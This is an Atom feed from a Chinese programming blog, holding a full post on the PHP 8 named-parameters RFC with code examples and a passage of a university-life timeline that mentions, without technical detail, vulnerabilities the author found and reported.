<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TWO SEE</title>
  
  <subtitle>SEE is the sea of cc</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.twosee.cn/"/>
  <updated>2020-08-01T01:52:16.796Z</updated>
  <id>http://www.twosee.cn/</id>
  
  <author>
    <name>Twosee</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>漫谈PHP8新特性：命名参数</title>
    <link href="http://www.twosee.cn/2020/07/17/php8-rfc-named-params/"/>
    <id>http://www.twosee.cn/2020/07/17/php8-rfc-named-params/</id>
    <published>2020-07-17T10:25:20.000Z</published>
    <updated>2020-08-01T01:52:16.796Z</updated>
    
    <content type="html"><![CDATA[<p>本文是对「<a href="https://wiki.php.net/rfc/named_params" target="_blank" rel="noopener">命名参数RFC</a>」的个人解读，先让我们来简单看下RFC的主要内容：</p><p>命名参数特性允许基于参数名称而不是参数位置来传递参数，这使得：</p><ol><li>可以跳过默认值</li><li>参数的传递可与顺序无关</li><li>参数的含义可以自我记录</li></ol><a id="more"></a><blockquote><p>其实这个特性的RFC早在2013年和2016年就有人建立过了，但一直没有通过或是实施，直到PHP8版本，该RFC终于得到机会再次启用，并且发起人是PHP内核的核心开发者Nikita Popov（nikic），nikic对此做了非常详细的调研，RFC全文字数差不多有三万字（相比于PHP的其它RFC而言已经是相当的多了），该RFC刚开始投票的时候还有一定的悬念（PHP社区的元老级人物对于新特性总是给出反对票），但很快赞同数就远超了2/3多数，目前RFC已投票通过。</p></blockquote><h2 id="命名参数的好处"><a href="#命名参数的好处" class="headerlink" title="命名参数的好处"></a>命名参数的好处</h2><h3 id="允许跳过默认值"><a href="#允许跳过默认值" class="headerlink" title="允许跳过默认值"></a>允许跳过默认值</h3><p>最显著的例子就是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// before</span></span><br><span class="line">htmlspecialchars($string, ENT_COMPAT | ENT_HTML401, ini_get(<span class="string">'default_charset'</span>), <span class="keyword">false</span>);</span><br><span class="line"><span class="comment">// after</span></span><br><span class="line">htmlspecialchars($string, double_encode: <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>在没有命名参数特性之前，我们为了设置第四个参数<code>double_encode</code>，不得不给出第二第三个可选参数的默认值，我们可能需要查询文档或是编写冗长的代码，而有了命名参数特性之后，一切都简单了，并且哪怕某个参数的默认值发生了变化，代码也不会受到影响（虽然几乎不存在这样的情况，但某种意义上也是消除了硬编码）。</p><h3 id="参数含义的自我记录及传递顺序无关性"><a href="#参数含义的自我记录及传递顺序无关性" class="headerlink" title="参数含义的自我记录及传递顺序无关性"></a>参数含义的自我记录及传递顺序无关性</h3><p>比如对于某个我们我们不熟的函数（当然实际上来说，array系列函数都不熟的话可能连面试都通不过…）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_fill(value: <span class="number">50</span>, start_index: <span class="number">0</span>, num: <span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>代码已经包含了对每个入参的意义的表达，并且传参顺序也可以任意改变。</p><h3 id="更简便的API调用"><a href="#更简便的API调用" class="headerlink" title="更简便的API调用"></a>更简便的API调用</h3><p>但我觉得这样的全命名写法一般来说是多此一举，容易造成书写风格的割裂，并且装了插件的编辑器或是IDE都能很好地显示出参数名。</p><p>所以这个特性最大的受益者应该是可选参数特别多或设计不合理的一些API，比如又臭又长的OpenSSL的API：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">openssl_encrypt</span><span class="params">(string $data, string $method, string $password, int $options = <span class="number">0</span>, string $iv = <span class="string">''</span>, &amp;$tag = UNKNOWN, string $aad = <span class="string">''</span>, int $tag_length = <span class="number">16</span>)</span>: <span class="title">string</span>|<span class="title">false</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="更快捷的对象属性的初始化"><a href="#更快捷的对象属性的初始化" class="headerlink" title="更快捷的对象属性的初始化"></a>更快捷的对象属性的初始化</h3><p>此外有所受益的是对象属性的初始化：</p><p>其实在早前就有RFC探讨了如何更好地初始化对象属性，以使对象构造更符合人体工程学。写过C++的同学肯定很快就想到了「<a href="https://zh.cppreference.com/w/cpp/language/list_initialization" target="_blank" rel="noopener">初始化列表</a>」，PHP也有人专门为此建立了一个RFC「<a href="https://wiki.php.net/rfc/object-initializer" target="_blank" rel="noopener">对象初始化器</a>」，但是显然专门为此添加一个新语法并不那么值得，以反对票一边倒的结果被拒绝了。但现在我们有了命名参数以后，这个问题自然就解决了：</p><blockquote><p>以下展示还包含了另一个已落地的PHP8新特性，<a href="https://wiki.php.net/rfc/constructor_promotion" target="_blank" rel="noopener">构造函数属性升级</a>，我们可以在声明构造函数的参数的同时将其声明为对象的属性：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Part of PHP AST representation</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParamNode</span> <span class="keyword">extends</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        public string $name,</span></span></span><br><span class="line"><span class="function"><span class="params">        public ExprNode $default = null,</span></span></span><br><span class="line"><span class="function"><span class="params">        public TypeNode $type = null,</span></span></span><br><span class="line"><span class="function"><span class="params">        public bool $byRef = false,</span></span></span><br><span class="line"><span class="function"><span class="params">        public bool $variadic = false,</span></span></span><br><span class="line"><span class="function"><span class="params">        Location $startLoc = null,</span></span></span><br><span class="line"><span class="function"><span class="params">        Location $endLoc = null</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($startLoc, $endLoc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> ParamNode(<span class="string">'test'</span>, variadic: <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>来看看没有这两个特性之前我们需要以怎样繁琐的方式写出同等的代码吧，我保证你肯定不想按以下方式写代码，除非你已经在用某种代码生成器来帮你完成这一工作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParamNode</span> <span class="keyword">extends</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> string $name;</span><br><span class="line">    <span class="keyword">public</span> ?ExprNode $default;</span><br><span class="line">    <span class="keyword">public</span> ?TypeNode $type;</span><br><span class="line">    <span class="keyword">public</span> bool $byRef;</span><br><span class="line">    <span class="keyword">public</span> bool $variadic;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        string $name,</span></span></span><br><span class="line"><span class="function"><span class="params">        ExprNode $default = null,</span></span></span><br><span class="line"><span class="function"><span class="params">        TypeNode $type = null,</span></span></span><br><span class="line"><span class="function"><span class="params">        bool $byRef = false,</span></span></span><br><span class="line"><span class="function"><span class="params">        bool $variadic = false,</span></span></span><br><span class="line"><span class="function"><span class="params">        Location $startLoc = null,</span></span></span><br><span class="line"><span class="function"><span class="params">        Location $endLoc = null</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = $type;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;byRef = $byRef;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;variadic = $variadic;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($startLoc, $endLoc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> ParamNode(<span class="string">'test'</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>或者有的人会选择用「数组」这个万金油来解决：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParamNode</span> <span class="keyword">extends</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> string $name;</span><br><span class="line">    <span class="keyword">public</span> ExprNode $default;</span><br><span class="line">    <span class="keyword">public</span> TypeNode $type;</span><br><span class="line">    <span class="keyword">public</span> bool $byRef;</span><br><span class="line">    <span class="keyword">public</span> bool $variadic;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $name, array $options = [])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;default = $options[<span class="string">'default'</span>] ?? <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = $options[<span class="string">'type'</span>] ?? <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;byRef = $options[<span class="string">'byRef'</span>] ?? <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;variadic = $options[<span class="string">'variadic'</span>] ?? <span class="keyword">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">parent</span>::__construct(</span><br><span class="line">            $options[<span class="string">'startLoc'</span>] ?? <span class="keyword">null</span>,</span><br><span class="line">            $options[<span class="string">'endLoc'</span>] ?? <span class="keyword">null</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Usage:</span></span><br><span class="line"><span class="keyword">new</span> ParamNode($name, [<span class="string">'variadic'</span> =&gt; <span class="keyword">true</span>]);</span><br></pre></td></tr></table></figure><p>有点小机灵，但是很遗憾，它的缺点更多：</p><ol><li>无法利用类型系统在传参时自动地检测（而是由于属性类型验证失败而报错）</li><li>你必须查看实现或是文档，且文档无法很好地记录它（没有公认的规范）</li><li>你可以悄无声息地传递未知选项而不会得到报错，这一错误非常普遍，曾经遇到有一个开发者将配置项名打错了一个字母，导致配置无法生效，却也没有得到任何报错，为此debug了一整天</li><li>没法利用新特性「构造函数属性升级」</li><li>如果你想将现有API切换到数组方式，你不得不破坏API兼容性，但命名参数不需要</li></ol><p>nikic非常自信地认为，相比而言，<strong>命名参数提供了同等便利，但没有任何缺点</strong>。</p><p>此外，RFC还简单延伸了一个备选方案，探讨如何解决历史代码中使用数组的缺陷：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParamNode</span> <span class="keyword">extends</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> string $name;</span><br><span class="line">    <span class="keyword">public</span> ExprNode $default;</span><br><span class="line">    <span class="keyword">public</span> TypeNode $type;</span><br><span class="line">    <span class="keyword">public</span> bool $byRef;</span><br><span class="line">    <span class="keyword">public</span> bool $variadic;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        string $name,</span></span></span><br><span class="line"><span class="function"><span class="params">        array [</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">'default'</span> =&gt; ExprNode $default = null,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">'type'</span> =&gt; TypeNode $type = null,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">'byRef'</span> =&gt; bool $type = false,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">'variadic'</span> =&gt; bool $variadic = false,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">'startLoc'</span> =&gt; Location $startLoc = null,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">'endLoc'</span> =&gt; Location $endLoc = null,</span></span></span><br><span class="line"><span class="function"><span class="params">        ],</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = $type;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;byRef = $byRef;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;variadic = $variadic;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($startLoc, $endLoc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然解决了类型安全问题，但无法解决默默接受未知选项的问题，并且还有很多需要考虑的难题，但不值得继续展开讨论。</p><h3 id="更好的注解兼容性"><a href="#更好的注解兼容性" class="headerlink" title="更好的注解兼容性"></a>更好的注解兼容性</h3><p>千呼万唤始出来，PHP8终于有了官方支持的注解特性，对于有些人来说这是比JIT还要让人激动的事情（因为对于他们来说JIT性能提升真的不是很大，PHP5到PHP7的跨越才是永远滴神），那么命名参数对注解又有什么好处呢？</p><p>曾经的路由注解可能是这样的（@Symfony Route）:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Route</span>("/api/posts/&#123;id&#125;", methods=&#123;"GET","HEAD"&#125;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">(int $id)</span> </span>&#123; ... &#125;</span><br></pre></td></tr></table></figure><p>有了官方注解以后可能是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;Route(<span class="string">"/api/posts/&#123;id&#125;"</span>, [<span class="string">"methods"</span> =&gt; [<span class="string">"GET"</span>, <span class="string">"HEAD"</span>]])&gt;&gt;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">(int $id)</span> </span>&#123; ... &#125;</span><br></pre></td></tr></table></figure><p>那么势必造成API的向下不兼容，但有了命名参数以后，我们完全可以保持相同的API结构：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;Route(<span class="string">"/api/posts/&#123;id&#125;"</span>, methods: [<span class="string">"GET"</span>, <span class="string">"HEAD"</span>])&gt;&gt;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">(int $id)</span> </span>&#123; ... &#125;</span><br></pre></td></tr></table></figure><blockquote><p>由于缺乏对嵌套注释的支持，仍然需要进行一些更改，但这会使迁移更加顺畅。</p></blockquote><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>好了，看到这里很多人应该会觉得：命名参数真是个好东西！双脚赞成！<br>如果是，那么很巧，我也是这么想的，尤其是刚学编程，尝试用Python写一个WEB小程序的时候，我有被命名参数特性小小地惊艳到。<br>但是我们不得不知道的是，以上介绍「好处」的内容仅仅是RFC篇幅的小头部分，剩下的上万字内容也是大多数人所并不关心或不需要关心的实施细节。但我们必须以此思考获得的收益是否能弥补变动的成本，这也正是反对者所忧虑的部分。</p><p>我在这里简单罗列一下添加该特性需要考虑的问题们：</p><ul><li>是否支持动态指定命名参数？如果是，如何支持？使用何种语法？和现有语法有何种冲突？可能影响到的未来语法？</li><li>约束条件：如命名参数必须在必选参数之后；不得传递相同的命名参数；不得以命名参数形式覆盖相同位置的参数；不得使用未知的命名参数</li><li>可变参函数和参数解压缩规则</li><li>受影响的API们（不完全）：<code>func_get_args</code>，<code>call_user_func</code>系列，<code>__invoke()</code>，<code>__call()</code>和<code>__callStatic()</code>等等</li><li>继承期间变量名的更改：是否将其视为错误？是，造成向下不兼容？否，违反里式替换原则怎么办？应遵循何种模型，其它哪些语言的实现值得参考？</li><li>对于内核实现的影响（太多了，不扩展）</li></ul><p>有兴趣的同学可以自己阅读原版RFC，体会一下一个看似简单的新特性添加需要多么深入的考虑。最重要的是你还要将它们总结出来并说服绝大部分社区成员投赞成票，不同的人发起同样的主题的RFC也可能会有不同的结果。</p><h2 id="最让人难受的事情"><a href="#最让人难受的事情" class="headerlink" title="最让人难受的事情"></a>最让人难受的事情</h2><h3 id="修改参数名即是破坏向后兼容性"><a href="#修改参数名即是破坏向后兼容性" class="headerlink" title="修改参数名即是破坏向后兼容性"></a>修改参数名即是破坏向后兼容性</h3><p>CS领域中头号难题：命名！</p><p>如果说命名空间、类名、函数方法名已经让我们痛苦不堪，那么现在我们获得了数倍于之前的痛苦，好好想想你的参数名吧，因为你以后不能随便改它了，并且这将是下划线派和驼峰派的又一个战争点，谁输谁赢，谁是新潮流？</p><blockquote><p>PS：PHP内核开发者们正在对成千上万个参数命名进行梳理工作…</p></blockquote><h3 id="文档和实现中的参数名称不匹配"><a href="#文档和实现中的参数名称不匹配" class="headerlink" title="文档和实现中的参数名称不匹配"></a>文档和实现中的参数名称不匹配</h3><p>参数命名的梳理的工作量翻倍了。</p><h2 id="未来方向"><a href="#未来方向" class="headerlink" title="未来方向"></a>未来方向</h2><h3 id="简写语法"><a href="#简写语法" class="headerlink" title="简写语法"></a>简写语法</h3><p>我们常常会在栈上使用和参数名一样的变量名，那么我们可能可以简化这一行为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// before:</span></span><br><span class="line"><span class="keyword">new</span> ParamNode(name: $name, type: $type, <span class="keyword">default</span>: $default, variadic: $variadic, byRef: $byRef);</span><br><span class="line"><span class="comment">// after:</span></span><br><span class="line"><span class="keyword">new</span> ParamNode(:$name, :$type, :$default, :$variadic, :$byRef);</span><br></pre></td></tr></table></figure><p>也适用于数组的解构（比较实用）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// before</span></span><br><span class="line">[<span class="string">'x'</span> =&gt; $x, <span class="string">'y'</span> =&gt; $y, <span class="string">'z'</span> =&gt; $z] = $point;</span><br><span class="line"><span class="comment">// after</span></span><br><span class="line">[:$x, :$y, :$z] = $point;</span><br></pre></td></tr></table></figure><p>这样我们可以废弃<code>compact</code>这种魔法一般的函数，刚学PHP的时候我好一会才理解这函数是干嘛的，作为函数，它的能力却和eval一样邪恶，这种特性应当是语法级别的。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>在我看来，这个特性的通过是必然的，这是一个迟早要实现的特性，对很多人来说更是一个姗姗来迟的特性。很多人不了解的是，PHP的RFC常常要求起草者自己想办法实现（包括找人代为实现），而不是直接进入投票环节通过后就强制要求PHP核心开发者实现（你行你上），因此有些RFC由于缺少靠谱的实施者所以就没有下文了。</p><p>此外，我所见的社区中的对于新特性反对声音大都是，PHP好好做本分事就行了，性能不如xxx，现在还天天加语法糖，学不动了之类的。但其实PHP社区的惯性不是一般的大，十几年前的垃圾堆里捡的代码放PHP7上居然还能继续跑，写Python的见了都忍不住666，写JS的看了表示就这？就这就学不动了？不会真有人学不动吧？不会吧不会吧？（要不是我真学不动JS了我可能现在还是个全栈的套页面工程师）</p><p>PHP8这个大版本是去其糟粕、辞旧迎新的好契机，恰逢nikic这样年轻有为的改革派，一些本不可能落地的废弃项和新特性都已安全着陆（未来有空我会介绍一些PHP8中让人拍手称快的糟粕废弃项），PHP更加地「通用脚本语言」，而不再是「Personal Home Page」。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是对「&lt;a href=&quot;https://wiki.php.net/rfc/named_params&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;命名参数RFC&lt;/a&gt;」的个人解读，先让我们来简单看下RFC的主要内容：&lt;/p&gt;
&lt;p&gt;命名参数特性允许基于参数名称而不是参数位置来传递参数，这使得：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;可以跳过默认值&lt;/li&gt;
&lt;li&gt;参数的传递可与顺序无关&lt;/li&gt;
&lt;li&gt;参数的含义可以自我记录&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="php8" scheme="http://www.twosee.cn/tags/php8/"/>
    
      <category term="rfc" scheme="http://www.twosee.cn/tags/rfc/"/>
    
  </entry>
  
  <entry>
    <title>9102记我刚刚结束的平平无奇的大学生活</title>
    <link href="http://www.twosee.cn/2019/06/28/my-college-life/"/>
    <id>http://www.twosee.cn/2019/06/28/my-college-life/</id>
    <published>2019-06-28T10:06:06.000Z</published>
    <updated>2020-07-26T19:09:13.107Z</updated>
    
    <content type="html"><![CDATA[<p>大学四年，出于兴趣和热爱，我大概经历了以下这些事情：</p><p>知乎带图链接：<a href="https://zhuanlan.zhihu.com/p/71304826" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/71304826</a></p><a id="more"></a><h4 id="2015年"><a href="#2015年" class="headerlink" title="2015年"></a>2015年</h4><ul><li>高考后成为外卖小哥，迷茫等待大学生涯</li><li>由于在入学某特长调研时如实填写了「毛笔字九级」和「漫画八级」，被诱拐进了学生会美术宣传部</li></ul><h4 id="2016年"><a href="#2016年" class="headerlink" title="2016年"></a>2016年</h4><ul><li>自学PS，成为了学院御用P图汪，承包了一年内学院所有的海报、公众号图片、GIF动画和活动PPT的制作</li><li>觉得做设计并不是自己的出路并持续怀疑人生…</li></ul><h4 id="2016年10月"><a href="#2016年10月" class="headerlink" title="2016年10月"></a>2016年10月</h4><ul><li>着手编写微信机器人(Custed雏形姬)，支持图灵聊天，网费充值，成绩查询，作业参考，网络报修，教务抢课，四六级代报代打印</li></ul><h4 id="2016年末"><a href="#2016年末" class="headerlink" title="2016年末"></a>2016年末</h4><ul><li>黑掉了校园一卡通充值系统(免登陆任意充值漏洞)，前往学校信息化中心报告，并籍此向老师和领导展示了我自认为牛逼哄哄的校园信息化计划草案，并立志从此招兵买马，实现我的创想</li><li>开始自学PHP/JS，并花一周时间重写了机器人，实现了Web版的<a href="https://m.cust.edu.cn" target="_blank" rel="noopener">Custed</a>的雏形</li></ul><h4 id="2016年12月"><a href="#2016年12月" class="headerlink" title="2016年12月"></a>2016年12月</h4><ul><li>短暂转型B站UP主，首次(也是最后一次)自制<a href="https://www.bilibili.com/video/av7495849" target="_blank" rel="noopener">AMV</a>，单日人气上动画分区TOP1 (当时B站流量没现在这么高啊)</li></ul><h4 id="2017年3月"><a href="#2017年3月" class="headerlink" title="2017年3月"></a>2017年3月</h4><ul><li>新学期万事俱备，APP上线公测，自制九图在本人的QQ空间进行了初步宣传获得3000点赞</li><li>自制海报奔走于三个校区张贴，宣传APP和招募成员</li></ul><h4 id="2017年4月"><a href="#2017年4月" class="headerlink" title="2017年4月"></a>2017年4月</h4><ul><li><a href="https://blog.tusi.site" target="_blank" rel="noopener">吐司工作室</a>成员招募成功并正式成立，开展会议成立小部门</li><li>工作室提早在校内封锁了勒索病毒相关端口，病毒在中国爆发后，长春理工大学未出现任何一例感染</li></ul><h4 id="2017年5-6月"><a href="#2017年5-6月" class="headerlink" title="2017年5~6月"></a>2017年5~6月</h4><ul><li>组织了<a href="https://m.cust.edu.cn/ed.cc" target="_blank" rel="noopener">校园一卡通大赛</a>和相关周边活动，由学生自主设计的最佳校园卡将在下一届投入使用</li></ul><h4 id="2017年9月"><a href="#2017年9月" class="headerlink" title="2017年9月"></a>2017年9月</h4><ul><li>新版<a href="https://app.cust.edu.cn" target="_blank" rel="noopener">Custed</a>雏形，<a href="https://ww1.sinaimg.cn/large/006DQdzWly1fn84iqbisvj30wo0oyacu.jpg" target="_blank" rel="noopener">技术架构升级</a>。</li></ul><h4 id="2017年10月"><a href="#2017年10月" class="headerlink" title="2017年10月"></a>2017年10月</h4><ul><li>QQ客服机器人吐司喵(Rocat)上线，智能应答学生群中的问题及提供服务器监控报警、组织消息群发、开会OTP签到等功能，至今仍在稳定运行</li></ul><h4 id="2017年下半年"><a href="#2017年下半年" class="headerlink" title="2017年下半年"></a>2017年下半年</h4><ul><li>开始接触并实践Linux下的运维操作，使用Docker部署服务和Docker-Compose编排服务，初步学习异步网络编程相关知识</li><li>入门Python并写了一些图片爬虫和学校题库数据整理脚本，用于题库APP方便学生背题</li><li>使用Python+Flask-SocketIO+requests写了一个基于WebSocket的QQ空间自动点赞机器人服务</li></ul><h4 id="2017年12月"><a href="#2017年12月" class="headerlink" title="2017年12月"></a>2017年12月</h4><ul><li>全国高校安全挑战赛决赛东北区第六</li></ul><h4 id="2018年前半年"><a href="#2018年前半年" class="headerlink" title="2018年前半年"></a>2018年前半年</h4><ul><li>学校领导采购smart-bi系统时，当场黑入对方公司系统后台，后提交漏洞盒子获高危评分</li><li>参加某全国大赛时和工作室小伙伴通过后台验证、文件上传漏洞、tty反射、Linux脏牛漏洞拿到了其服务器root权限，后上报修复</li></ul><h4 id="2018年3月"><a href="#2018年3月" class="headerlink" title="2018年3月"></a>2018年3月</h4><ul><li>尝试入门C语言并开始学习Linux下的高性能网络编程</li></ul><h4 id="2018年4月"><a href="#2018年4月" class="headerlink" title="2018年4月"></a>2018年4月</h4><ul><li>创建<a href="https://github.com/swlib" target="_blank" rel="noopener">Swlib</a>(Swoole人性化组件库)和后来社区的流行项目<a href="https://github.com/swlib/saber" target="_blank" rel="noopener">Saber</a></li><li>对社区知名开源项目<a href="https://github.com/swoft-cloud/swoft" target="_blank" rel="noopener">Swoft</a>和<a href="https://github.com/easy-swoole/easyswoole" target="_blank" rel="noopener">EasySwoole</a>贡献代码</li></ul><h4 id="2018年5月"><a href="#2018年5月" class="headerlink" title="2018年5月"></a>2018年5月</h4><ul><li>成为<a href="https://github.com/swoole/swoole-src" target="_blank" rel="noopener">Swoole</a>的Contributor</li></ul><h4 id="2018年6月"><a href="#2018年6月" class="headerlink" title="2018年6月"></a>2018年6月</h4><ul><li>优化代码，助力Swoole登上全球权威的Web项目性能跑分排行榜(<a href="https://www.techempower.com/benchmarks/#section=data-r17&amp;hw=ph&amp;test=fortune" target="_blank" rel="noopener">TechEmpower</a>)第四，MySQL项第一</li></ul><h4 id="2018年7月"><a href="#2018年7月" class="headerlink" title="2018年7月"></a>2018年7月</h4><ul><li><p>受邀成为<a href="https://github.com/swoole/swoole-src" target="_blank" rel="noopener">Swoole</a>开发组成员</p></li><li><p>受邀在<a href="http://www.swoole-cloud.com/" target="_blank" rel="noopener">上海识沃网络科技有限公司</a>实习，开源事业为主，参与了商业项目的一些边角工作</p></li></ul><h4 id="2018年10月"><a href="#2018年10月" class="headerlink" title="2018年10月"></a>2018年10月</h4><ul><li>成为<a href="https://github.com/php/php-src" target="_blank" rel="noopener">PHP</a>的Contributor，多次修复ZendVM的BUG和做出一些优化</li><li>发布基于Swoole协程编写的的<a 